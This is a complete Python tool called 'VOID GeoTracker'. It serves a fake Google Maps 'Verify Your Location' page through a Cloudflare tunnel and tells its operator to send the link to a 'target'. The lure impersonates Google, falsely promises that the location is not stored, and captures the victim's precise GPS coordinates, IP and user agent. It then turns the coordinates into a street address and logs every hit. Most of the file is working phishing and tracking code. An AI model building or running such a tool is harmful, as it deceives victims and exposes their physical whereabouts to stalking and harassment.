#!/usr/bin/env python3
# ══════════════════════════════════════════════════════════════════
#  VOID GeoTracker — Browser-based Geolocation Capture
#  Creates a Cloudflare tunnel link. Victim opens it → browser
#  asks for location permission → coords sent back silently.
#  For authorized use only.
# ══════════════════════════════════════════════════════════════════

import subprocess, sys, os

def _ensure_deps():
    pkgs = ["flask", "requests", "rich"]
    for pkg in pkgs:
        try:
            __import__(pkg)
        except ImportError:
            print(f"[*] Installing {pkg}...")
            try:
                subprocess.check_call([sys.executable,"-m","pip","install",pkg,"-q","--break-system-packages"],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            except subprocess.CalledProcessError:
                subprocess.check_call([sys.executable,"-m","pip","install",pkg,"-q"],
                                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
_ensure_deps()

import json, re, time, threading, shutil, socket
from datetime import datetime
import requests as req_lib
from flask import Flask, request, Response, jsonify
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.text import Text
from rich.align import Align
from rich.rule import Rule
from rich.live import Live
from rich import box

console = Console()
app     = Flask(__name__)
app.logger.disabled = True
import logging; log = logging.getLogger("werkzeug"); log.setLevel(logging.ERROR)

# ── Global state ──────────────────────────────────────────────────
_hits      = []
_hits_lock = threading.Lock()

# ══════════════════════════════════════════════════════════════════
#  GEOLOCATION PAGE  (Google Maps "verify location" lure)
# ══════════════════════════════════════════════════════════════════

GEO_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Google Maps — Verify Location</title>
  <link rel="icon" href="https://maps.google.com/favicon.ico">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Google Sans', Roboto, Arial, sans-serif;
      background: radial-gradient(ellipse at top, #1a237e 0%, #0d0d0d 60%);
      display: flex; align-items: center; justify-content: center;
      min-height: 100vh;
    }
    .card {
      background: rgba(255,255,255,.06);
      backdrop-filter: blur(20px);
      border: 1px solid rgba(255,255,255,.12);
      border-radius: 24px;
      padding: 48px 40px 36px;
      max-width: 420px; width: 90%;
      text-align: center;
      box-shadow: 0 24px 80px rgba(0,0,0,.6);
    }
    .maps-bar {
      display: flex; align-items: center; justify-content: center;
      gap: 10px; margin-bottom: 32px;
    }
    .maps-bar svg { width: 36px; height: 36px; }
    .maps-bar span { font-size: 20px; font-weight: 400; color: #e8eaed; }
    .pin-wrap {
      width: 72px; height: 72px; margin: 0 auto 24px;
      animation: float 3s ease-in-out infinite;
    }
    @keyframes float {
      0%,100% { transform: translateY(0); }
      50%      { transform: translateY(-8px); }
    }
    .ring {
      width: 60px; height: 12px; background: rgba(0,0,0,.25);
      border-radius: 50%; margin: 0 auto;
      animation: shadow 3s ease-in-out infinite;
    }
    @keyframes shadow {
      0%,100% { transform: scaleX(1); opacity:.5; }
      50%      { transform: scaleX(.7); opacity:.2; }
    }
    h2 { font-size: 22px; font-weight: 600; color: #e8eaed; margin-bottom: 10px; }
    .sub {
      font-size: 14px; color: #9aa0a6; line-height: 1.65;
      margin-bottom: 36px; padding: 0 8px;
    }
    .btn {
      width: 100%; background: #1a73e8; color: #fff; border: none;
      padding: 14px; border-radius: 100px; font-size: 16px;
      font-weight: 500; cursor: pointer; margin-bottom: 10px;
      transition: background .2s, opacity .2s;
    }
    .btn:hover:not(:disabled) { background: #1558b0; }
    .btn:disabled { opacity: .5; cursor: default; }
    .skip {
      background: transparent; color: #9aa0a6; border: none;
      font-size: 14px; cursor: pointer; padding: 8px; width: 100%;
    }
    .skip:hover { color: #e8eaed; }
    .spinner {
      display: none; width: 28px; height: 28px; margin: 16px auto 0;
      border: 3px solid rgba(255,255,255,.15);
      border-top-color: #1a73e8;
      border-radius: 50%; animation: spin .7s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }
    .status { margin-top: 14px; font-size: 13px; color: #9aa0a6; min-height: 18px; }
    .ok { color: #34a853; font-weight: 600; }
    .footer { margin-top: 32px; font-size: 11px; color: #5f6368; line-height: 1.8; }
    .footer a { color: #5f6368; text-decoration: none; }
    .footer a:hover { text-decoration: underline; }
    /* permission notice bar */
    .notice {
      display: flex; align-items: flex-start; gap: 10px;
      background: rgba(255,255,255,.05); border-radius: 12px;
      padding: 12px 14px; margin-bottom: 28px; text-align: left;
    }
    .notice svg { flex-shrink: 0; margin-top: 2px; }
    .notice p { font-size: 12px; color: #9aa0a6; line-height: 1.5; }
  </style>
</head>
<body>
<div class="card">

  <!-- Header -->
  <div class="maps-bar">
    <svg viewBox="0 0 192 192" xmlns="http://www.w3.org/2000/svg">
      <path fill="#1A73E8" d="M96 16C62.9 16 36 42.9 36 76c0 44.5 56.2 92 57.5 93.1a4 4 0 0 0 5 0C99.8 168 160 120.5 160 76c0-33.1-26.9-60-64-60z"/>
      <circle cx="96" cy="76" r="22" fill="white"/>
    </svg>
    <span>Google Maps</span>
  </div>

  <!-- Animated pin -->
  <div class="pin-wrap">
    <svg viewBox="0 0 80 96" xmlns="http://www.w3.org/2000/svg">
      <path fill="#EA4335" d="M40 0C19.6 0 3 16.6 3 37c0 26.2 34 68 37 71.5.5.6 1.5.6 2 0C45 105 77 63.2 77 37 77 16.6 60.4 0 40 0z"/>
      <circle cx="40" cy="37" r="14" fill="white"/>
    </svg>
  </div>
  <div class="ring"></div>

  <h2 style="margin-top:16px">Verify Your Location</h2>

  <p class="sub">
    Google Maps needs to confirm your device location to display
    accurate routes, local businesses, and real-time traffic near you.
  </p>

  <!-- Permission notice -->
  <div class="notice">
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z" fill="#1a73e8"/>
    </svg>
    <p>Your browser will ask for location permission. This is used only to verify your region and is not stored by Google.</p>
  </div>

  <button class="btn" id="allowBtn" onclick="requestLocation()">
    Allow Location &amp; Continue
  </button>
  <button class="skip" onclick="window.location='https://maps.google.com'">
    Not now
  </button>

  <div class="spinner" id="spin"></div>
  <div class="status" id="status"></div>

  <div class="footer">
    <a href="#">Google LLC</a> · <a href="#">Privacy Policy</a> · <a href="#">Terms</a><br>
    Location Services · Maps Platform
  </div>
</div>

<script>
var done = false;

function requestLocation() {
  if (done) return;
  var btn    = document.getElementById('allowBtn');
  var spin   = document.getElementById('spin');
  var status = document.getElementById('status');

  btn.disabled    = true;
  btn.textContent = 'Verifying…';
  spin.style.display = 'block';
  status.textContent = '';

  function send(payload) {
    if (done) return;
    done = true;
    fetch('/location', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(payload)
    })
    .then(function() {
      spin.style.display = 'none';
      status.innerHTML = '<span class="ok">✓ Location verified</span>';
      btn.textContent = 'Done';
      setTimeout(function() {
        window.location.href = 'https://maps.google.com';
      }, 1800);
    })
    .catch(function() {
      spin.style.display = 'none';
      status.textContent = 'Verification error. Please retry.';
      btn.disabled = false;
      btn.textContent = 'Allow Location & Continue';
      done = false;
    });
  }

  if (!navigator.geolocation) {
    send({lat:null, lon:null, accuracy:null, denied:true, reason:'Geolocation API not supported'});
    return;
  }

  navigator.geolocation.getCurrentPosition(
    function(pos) {
      send({
        lat:      pos.coords.latitude,
        lon:      pos.coords.longitude,
        accuracy: pos.coords.accuracy,
        altitude: pos.coords.altitude,
        denied:   false
      });
    },
    function(err) {
      send({lat:null, lon:null, accuracy:null, denied:true, reason:err.message});
    },
    {enableHighAccuracy:true, timeout:14000, maximumAge:0}
  );
}
</script>
</body>
</html>
"""

# ══════════════════════════════════════════════════════════════════
#  FLASK ROUTES
# ══════════════════════════════════════════════════════════════════

@app.route("/", methods=["GET"])
def index():
    return Response(GEO_HTML, mimetype="text/html")

@app.route("/location", methods=["POST"])
def location():
    try:
        data = request.get_json(force=True, silent=True) or {}
    except Exception:
        data = {}

    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "unknown") \
                         .split(",")[0].strip()
    ua = request.headers.get("User-Agent", "")

    hit = {
        "time":     datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "ip":       ip,
        "lat":      data.get("lat"),
        "lon":      data.get("lon"),
        "accuracy": data.get("accuracy"),
        "denied":   data.get("denied", False),
        "reason":   data.get("reason", ""),
        "ua":       ua[:120],
        "address":  "",
    }

    if hit["lat"] and hit["lon"]:
        hit["address"] = _reverse_geocode(hit["lat"], hit["lon"])

    with _hits_lock:
        _hits.append(hit)

    _save_log()
    return jsonify({"ok": True})

# ══════════════════════════════════════════════════════════════════
#  REVERSE GEOCODE  (Nominatim — no API key needed)
# ══════════════════════════════════════════════════════════════════

def _reverse_geocode(lat, lon) -> str:
    try:
        r = req_lib.get(
            "https://nominatim.openstreetmap.org/reverse",
            params={"lat": lat, "lon": lon, "format": "json"},
            headers={"User-Agent": "VoidGeoTracker/1.0"},
            timeout=6
        )
        d = r.json()
        return d.get("display_name", "Unknown location")[:120]
    except Exception:
        return "Geocoding unavailable"

# ══════════════════════════════════════════════════════════════════
#  CLOUDFLARE TUNNEL
# ══════════════════════════════════════════════════════════════════

def _install_cloudflared():
    dest = "/usr/local/bin/cloudflared"
    url  = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
    console.print("  [dim cyan]⟳  Downloading cloudflared...[/]")
    try:
        r = req_lib.get(url, stream=True, timeout=30)
        tmp = "/tmp/cloudflared_dl"
        with open(tmp, "wb") as f:
            for chunk in r.iter_content(8192): f.write(chunk)
        os.chmod(tmp, 0o755)
        subprocess.run(["sudo","mv",tmp,dest], check=True,
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        return True
    except Exception as e:
        console.print(f"  [red]cloudflared install failed: {e}[/]")
        return False

def start_cloudflared(port: int):
    if not shutil.which("cloudflared"):
        if not _install_cloudflared():
            return None, None
    try:
        proc = subprocess.Popen(
            ["cloudflared","tunnel","--url",f"http://localhost:{port}"],
            stdout=subprocess.PIPE, stderr=subprocess.PIPE
        )
        for _ in range(45):
            line = proc.stderr.readline().decode("utf-8", errors="ignore")
            m = re.search(r'https://[a-z0-9\-]+\.trycloudflare\.com', line)
            if m:
                return proc, m.group(0)
        return proc, None
    except Exception as e:
        console.print(f"  [red]Tunnel error: {e}[/]")
        return None, None

# ══════════════════════════════════════════════════════════════════
#  LOG
# ══════════════════════════════════════════════════════════════════

def _save_log():
    fname = f"geo_captures_{datetime.now().strftime('%Y%m%d')}.json"
    try:
        with _hits_lock:
            data = list(_hits)
        with open(fname, "w") as f:
            json.dump(data, f, indent=2)
    except Exception:
        pass

# ══════════════════════════════════════════════════════════════════
#  RICH UI
# ══════════════════════════════════════════════════════════════════

def banner():
    console.clear()
    art = [
        "  ██████╗ ███████╗ ██████╗ ",
        "  ██╔════╝ ██╔════╝██╔═══██╗",
        "  ██║  ███╗█████╗  ██║   ██║",
        "  ██║   ██║██╔══╝  ██║   ██║",
        "  ╚██████╔╝███████╗╚██████╔╝",
        "   ╚═════╝ ╚══════╝ ╚═════╝ ",
    ]
    colors = ["bright_green","green","bright_green","green","bright_green","dim green"]
    txt = Text()
    for i, l in enumerate(art):
        txt.append(l + "\n", style=colors[i])
    console.print(Align.center(txt))
    sub = Text()
    sub.append("  ◈ ", style="bright_green")
    sub.append("GEOTRACKER", style="bold bright_white")
    sub.append("  ·  ", style="dim")
    sub.append("Browser Geolocation Capture via Cloudflare", style="dim white")
    sub.append(" ◈  ", style="bright_green")
    console.print(Align.center(sub))
    console.print(Align.center(Text("by @lfw.k4rma_  ·  FOR AUTHORIZED USE ONLY\n", style="dim green")))
    console.print(Rule(style="bright_green"))

def _build_table():
    t = Table(box=box.SIMPLE_HEAVY, border_style="dim green",
              header_style="bold bright_green", expand=True)
    t.add_column("#",        width=4,  style="dim")
    t.add_column("TIME",     width=20, style="dim cyan")
    t.add_column("IP",       width=16, style="bright_cyan")
    t.add_column("LAT / LON",width=26, style="bright_white")
    t.add_column("ACCURACY", width=12, style="yellow")
    t.add_column("ADDRESS",  min_width=30, style="dim white")

    with _hits_lock:
        rows = list(_hits)

    for i, h in enumerate(rows, 1):
        if h.get("denied"):
            coords = f"[dim red]DENIED — {h.get('reason','')[:30]}[/]"
            acc    = "—"
        elif h.get("lat"):
            coords = f"{h['lat']:.5f}, {h['lon']:.5f}"
            acc    = f"±{h['accuracy']:.0f}m" if h.get("accuracy") else "—"
        else:
            coords = "[dim]pending[/]"
            acc    = "—"
        t.add_row(str(i), h.get("time",""), h.get("ip",""),
                  coords, acc, h.get("address","")[:60])
    return t

def _detail_panel(h: dict):
    """Print a rich detail card for a fresh hit."""
    console.print()
    console.print(Rule("[bold bright_green]  ◈ NEW HIT  ◈  [/bold bright_green]", style="bright_green"))
    if h.get("denied"):
        console.print(f"  [bold red]✗  Permission denied[/]  [dim]— {h.get('reason','')}[/]")
    else:
        console.print(f"  [bright_green]✓  Location received[/]")
        console.print(f"  [dim]IP       :[/]  [bright_cyan]{h['ip']}[/]")
        if h.get("lat"):
            console.print(f"  [dim]Latitude :[/]  [bright_white]{h['lat']:.6f}[/]")
            console.print(f"  [dim]Longitude:[/]  [bright_white]{h['lon']:.6f}[/]")
            if h.get("accuracy"):
                console.print(f"  [dim]Accuracy :[/]  [yellow]±{h['accuracy']:.1f} metres[/]")
            console.print(f"  [dim]Maps URL :[/]  [blue underline]https://maps.google.com/?q={h['lat']},{h['lon']}[/]")
        if h.get("address"):
            console.print(f"  [dim]Address  :[/]  [dim white]{h['address']}[/]")
    console.print(f"  [dim]UA       :[/]  [dim]{h.get('ua','')[:80]}[/]")
    console.print(Rule(style="dim green"))

# ══════════════════════════════════════════════════════════════════
#  MAIN
# ══════════════════════════════════════════════════════════════════

def free_port(preferred=7070):
    for p in [preferred] + list(range(7071, 7120)):
        with socket.socket() as s:
            try: s.bind(("", p)); return p
            except OSError: continue
    return preferred

def main():
    banner()

    console.print()
    console.print(f"  [dim green]◈[/]  This tool creates a temporary public link.")
    console.print(f"  [dim]   When the target opens it, their browser requests location[/]")
    console.print(f"  [dim]   permission. Coordinates are captured and displayed here.[/]")
    console.print()
    console.print(f"  [dim green]◈[/]  ", end="")
    go = input("Start GeoTracker? (Y/N): ").strip().lower()
    if go not in ("y","yes"):
        console.print("  [dim]Cancelled.[/]"); return

    port = free_port(7070)

    # Start Flask
    t = threading.Thread(
        target=lambda: app.run(host="0.0.0.0", port=port, debug=False,
                               use_reloader=False, threaded=True),
        daemon=True
    )
    t.start()
    time.sleep(0.6)

    # Start Cloudflare tunnel
    console.print("  [dim cyan]⟳  Starting Cloudflare tunnel...[/]")
    tunnel_proc, tunnel_url = start_cloudflared(port)

    local_ip = socket.gethostbyname(socket.gethostname())
    console.print(Rule(style="bright_green"))
    console.print(f"  [bright_green]◈  GEOTRACKER LIVE[/]")
    console.print()
    console.print(f"  [dim]Local :[/]   [bright_cyan]http://{local_ip}:{port}[/]")
    if tunnel_url:
        console.print(f"  [dim]Public:[/]   [bold bright_green]{tunnel_url}[/]  [dim]← send this to the target[/]")
    else:
        console.print(f"  [dim]Public:[/]   [dim red]Tunnel failed — use local IP or set up ngrok manually[/]")
    console.print()
    console.print(f"  [dim]When the target opens the link and clicks Allow, their[/]")
    console.print(f"  [dim]location will appear below in real-time.[/]")
    console.print(Rule(style="dim green"))
    console.print(f"\n  [bold bright_green]◈  WAITING FOR HITS[/]  [dim](Ctrl+C to stop)[/]\n")

    seen = 0
    try:
        with Live(_build_table(), refresh_per_second=2, console=console) as live:
            while True:
                # Snapshot new hits under the lock — no race condition
                with _hits_lock:
                    new_hits = list(_hits[seen:])
                    seen += len(new_hits)

                # console.print() above a Live display is safe in Rich 13+
                for h in new_hits:
                    _detail_panel(h)

                live.update(_build_table())
                time.sleep(0.4)
    except KeyboardInterrupt:
        pass

    if tunnel_proc:
        tunnel_proc.terminate()

    _save_log()
    with _hits_lock:
        total = len(_hits)
    console.print(f"\n  [bright_green]◈[/]  Session ended  ·  [bold]{total}[/] hit(s) captured")
    fname = f"geo_captures_{datetime.now().strftime('%Y%m%d')}.json"
    console.print(f"  [dim]Results saved to:[/]  [bright_cyan]{fname}[/]")
    console.print(Rule(style="dim green"))

if __name__ == "__main__":
    main()
